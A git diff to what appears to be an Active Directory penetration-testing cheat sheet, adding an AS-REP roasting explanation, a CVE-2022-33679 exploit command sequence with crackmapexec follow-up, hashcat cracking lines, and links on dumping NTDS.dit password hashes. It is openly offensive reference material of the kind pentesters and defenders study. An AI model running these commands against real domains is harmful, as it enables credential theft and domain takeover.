@@ -143,6 +143,9 @@
       - [Machine/Computer accounts 2](#machinecomputer-accounts-2)
   - [Post-Exploitation](#post-exploitation)
     - [Computer accounts privesc](#computer-accounts-privesc)
+    - [Extract NTDS](#extract-ntds)
+      - [Extract NTDS without Admin priv](#extract-ntds-without-admin-priv)
+      - [Multiple ways to extract NTDS](#multiple-ways-to-extract-ntds)
     - [Active Directory NTDS : Clear Text passwords (Reversible encryption)](#active-directory-ntds--clear-text-passwords-reversible-encryption)
     - [DCSYNC](#dcsync)
     - [Accessing LSASS secrets](#accessing-lsass-secrets)
@@ -185,6 +188,7 @@
     - [Windows Defender : Device Guard](#windows-defender--device-guard)
     - [Windows Defender : Credential Guard](#windows-defender--credential-guard)
   - [Resources](#resources)
+      - [Steve Syfuhs blog](#steve-syfuhs-blog)
       - [Red Team Cheatsheet](#red-team-cheatsheet)
       - [OCD - AD Mind Map](#ocd---ad-mind-map)
       - [PetitPotam and ADCS](#petitpotam-and-adcs)
@@ -316,9 +320,12 @@ rdp-sec-check.pl 10.0.0.93
 rpcclient -U '' -N 10.10.0.10 -c "querygroupmem 0x200" |  cut -d '[' -f 2 | cut -d ']' -f 1
 ```
 ### AS-Rep Roasting
+- https://blog.xpnsec.com/kerberos-attacks-part-2/
+> During the initial authentication stage, a user requests a Ticket Granting Ticket (TGT) from the KDC in the form of a AS-REQ packet. If the account exists, the KDC will return a TGT encrypted with the account’s credentials, meaning that only a valid user or machine possessing the valid credentials is able to decrypt the ticket
+
 When a TGT request is made, the user must, by default, authenticate to the KDC in order for it to respond. Sometimes, this prior authentication is not requested for some accounts, allowing an attacker to abuse this configuration.
 
-This configuration allows retrieving password hashes for users that have *Do not require Kerberos preauthentication* property selected:
+This configuration allows retrieving TGT encrypted with user's credential for users that have *Do not require Kerberos preauthentication* property selected:
 
 - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
 ```
@@ -331,6 +338,16 @@ Rubeus.exe asreproast /domain:COMPANY.LOCAL /dc:192.168.0.10 /format:hashcat /ou
 hashcat -m 18200 'asrep-roast.hashes' -a 0 ./wordlists/rockyou.txt
 ```
 
+Google Project Zero [undercover](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html) some issue with RC4 and Kerberos authentication.  
+If a user have *Do not require Kerberos preauthentication* property there is [no more the need to crack the encrypted TGT](https://github.com/Bdenneu/CVE-2022-33679).
+```
+python3 CVE-2022-33679.py evilcorp.local/vulnasrepuser dc-2016.evilcorp.local -dc-ip 192.168.2.60
+export KRB5CCNAME=vulnasrepuser_dc-2016.evilcorp.local.ccache 
+crackmapexec smb dc-2016.evilcorp.local -k
+```
+<img src="./images/asprepwithoutcrack1.png" width="500"/>
+
+<img src="./images/asprepwithoutcrack2.png" width="500"/>
 
 ## Authenticated enumeration
 
@@ -1317,9 +1334,6 @@ $VerbosePreference = "Continue"
 
 
 
-
-
-
 ## Post-Exploitation
 
 ### Computer accounts privesc
@@ -1327,6 +1341,24 @@ $VerbosePreference = "Continue"
 
 1. Compromise an account with admin rights to admin server.
 2. Admin server computer account needs rights to Domain Controllers.
+
+
+### Extract NTDS
+#### Extract NTDS without Admin priv
+- https://www.youtube.com/watch?v=KWLA_OLanPc
+
+#### Multiple ways to extract NTDS
+- https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/
+- https://www.puckiestyle.nl/extracting-password-hashes-from-the-ntds-dit-file/
+- https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
+- https://www.cyberis.com/article/obtaining-ntdsdit-using-built-windows-commands
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
+- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/
+- https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin
+- https://www.hackingarticles.in/credential-dumping-ntds-dit/
+- https://stealthbits.com/attacks/ntdsdit-password-extraction/
+- https://www.ultimatewindowssecurity.com/blog/default.aspx?d=10/2017
 
 
 ### Active Directory NTDS : Clear Text passwords (Reversible encryption)
@@ -1668,6 +1700,9 @@ dpat.py -n ntds.dit -c hashcat.potfile -g "Domain Admins.txt" "Enterprise Admins
 
 ## Resources
 
+#### Steve Syfuhs blog
+- https://syfuhs.net/
+
 #### Red Team Cheatsheet 
 - https://0xsp.com/offensive/red-team-cheatsheet/
 
@@ -1747,7 +1782,6 @@ https://www.praetorian.com/blog/reproducing-proxylogon-exploit/
 - LAPS and LAPS bypass
 https://www.praetorian.com/blog/obtaining-laps-passwords-through-ldap-relaying-attacks/
 - script to enum domain group, protected user unauthenticated (bash + python projects)
-- Kerberoast/asrep
 - https://pentestbook.six2dez.com/post-exploitation/windows/ad
 - ldap signing
 - Spooler
